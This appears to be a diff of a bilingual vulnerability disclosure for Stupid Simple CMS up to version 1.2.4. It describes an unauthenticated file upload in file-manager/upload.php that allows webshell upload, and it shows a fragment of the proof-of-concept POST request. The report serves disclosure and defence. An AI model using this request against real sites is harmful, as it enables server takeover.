@@ -1,6 +1,9 @@
 product： Stupid Simple CMS ( Blogger )
+
 download link： https://github.com/codelyfe/Stupid-Simple-CMS
+
 version：<=1.2.4
+
 POC:
 ```shell
 POST http://127.0.0.1/file-manager/upload.php HTTP/1.1
@@ -29,7 +32,9 @@ Content-Type: image/png
 ------WebKitFormBoundarypgrUEkuaER8vFmOt--
 ```
 You can getshell directly.  
+
 Code audit found that the file upload interface has no authentication measures, which can lead to arbitrary file upload getshell.
+
 可以直接getshell
 代码审计发现文件上传接口无鉴权措施，可导致任意文件上传getshell
 ![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312132216678.png)
